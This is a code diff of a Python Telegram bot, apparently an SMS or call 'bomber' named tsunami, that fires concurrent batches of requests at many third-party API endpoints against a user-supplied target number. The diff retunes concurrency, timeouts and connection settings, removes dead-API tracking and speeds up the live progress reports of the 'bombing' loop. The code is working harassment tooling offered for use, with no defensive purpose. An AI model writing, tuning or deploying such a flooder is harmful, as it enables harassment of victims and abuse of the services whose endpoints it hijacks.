@@ -10,7 +10,6 @@ import hashlib
 import base64
 import json
 from typing import Optional
-import collections
 
 import aiohttp
 from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
@@ -29,21 +28,18 @@ PORT        = int(os.environ.get("PORT", 8000))
 
 ADMIN_ID = 8959878185  
 
-# ULTRA FAST MODE
-CONCURRENCY     = 500              
-DELAY           = 0.0              
-REQUEST_TIMEOUT = 2  # 2 second timeout (Dead APIs jaldi skip hongi)
+# FAST & SAFE CONFIG FOR RENDER
+CONCURRENCY     = 150              # 150 parallel requests
+DELAY           = 0.0              # No delay
+REQUEST_TIMEOUT = 1.5              # Dead APIs ko jaldi chhod do
 # ============================================
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger("tsunami")
 
 DB_FILE = "users.json"
-users_db = {}
-active_bombing = {}
-
-# Dead API Tracking
-_api_stats = collections.defaultdict(lambda: {"fail": 0, "skip_until": 0})
+users_db: dict = {}
+active_bombing: dict = {} 
 
 _http_session: Optional[aiohttp.ClientSession] = None
 telegram_app: Optional[Application] = None
@@ -63,7 +59,7 @@ def save_db():
         with open(DB_FILE, "w") as f:
             json.dump(users_db, f, indent=4)
     except Exception as e:
-        pass
+        logger.error(f"DB Save Error: {e}")
 
 def get_user(uid):
     uid_str = str(uid)
@@ -74,27 +70,19 @@ def get_user(uid):
 
 load_db()
 
-# ================== DEAD API LOGIC ==================
-def _is_alive(ep_name: str) -> bool:
-    st = _api_stats[ep_name]
-    return time.time() >= st["skip_until"]
-
-def _record(ep_name: str, ok: bool):
-    st = _api_stats[ep_name]
-    if ok:
-        st["fail"] = 0
-    else:
-        st["fail"] += 1
-        if st["fail"] >= 3:  # 3 baar fail = 10 min skip
-            st["skip_until"] = time.time() + 600
-            st["fail"] = 0
-
-# ================== HTTP SESSION ==================
+# ================== HTTP SESSION (OPTIMIZED) ==================
 async def get_http_session() -> aiohttp.ClientSession:
     global _http_session
     if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=1000, limit_per_host=150, ssl=False, force_close=True)
-        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
+        connector = aiohttp.TCPConnector(
+            limit=300, 
+            limit_per_host=100, 
+            ssl=False, 
+            force_close=False, 
+            enable_cleanup_closed=True,
+            ttl_dns_cache=300
+        )
+        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=1.0)
         _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
     return _http_session
 
@@ -241,11 +229,8 @@ async def fire_endpoint(ep: dict, target: str) -> bool:
         session = await get_http_session()
         async with session.request(method=ep["method"], url=url, headers=headers, data=data if data else None, ssl=False) as resp:
             await resp.read()
-            ok = resp.status in (200, 201, 202)
-            _record(ep["name"], ok)
-            return ok
+            return resp.status in (200, 201, 202)
     except Exception:
-        _record(ep["name"], False)
         return False
 
 async def _fire_batch(batch, target):
@@ -307,7 +292,6 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         s["running"] = True
         s["start_time"] = time.time()
         s["sent"] = 0
-        s["round"] = 0
         
         keyboard = [[InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bomb")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -379,28 +363,22 @@ async def run_bombing(uid: int, s: dict):
                 break
                 
             s["round"] = s.get("round", 0) + 1
-            
-            # Dead APIs ko filter karo
-            alive_eps = [ep for ep in ENDPOINTS if _is_alive(ep["name"])]
-            if not alive_eps:
-                alive_eps = ENDPOINTS # Agar sab dead hain toh wapas sab try karo
-                
             batch = []
             for _ in range(CONCURRENCY):
-                batch.append(alive_eps[idx % len(alive_eps)])
+                batch.append(ENDPOINTS[idx % len(ENDPOINTS)])
                 idx += 1
 
             ok = await _fire_batch(batch, target)
             sent += ok
             s["sent"] = sent
 
-            # Live Progress
+            # Live Progress every 5 seconds
             now = time.time()
-            if now - last_report >= 15:
+            if now - last_report >= 5:
                 last_report = now
                 try:
                     elapsed = int(now - start)
-                    speed = int(sent / elapsed) if elapsed > 0 else 0
+                    speed = round(sent / elapsed, 1) if elapsed > 0 else 0
                     await telegram_app.bot.send_message(
                         uid,
                         f"📊 **Live Update**\n"
@@ -413,7 +391,10 @@ async def run_bombing(uid: int, s: dict):
                 except Exception:
                     pass
 
-            await asyncio.sleep(0.01) # Fast but stable
+            if DELAY > 0:
+                await asyncio.sleep(DELAY)
+            else:
+                await asyncio.sleep(0.01)
 
     except Exception as e:
         logger.exception(f"Bombing error: {e}")
@@ -422,7 +403,7 @@ async def run_bombing(uid: int, s: dict):
 
     try:
         elapsed = int(time.time() - start)
-        speed = int(sent / elapsed) if elapsed > 0 else 0
+        speed = round(sent / elapsed, 1) if elapsed > 0 else 0
         
         if s.get("cancelled"):
             reason = "🛑 **Stopped by you**"
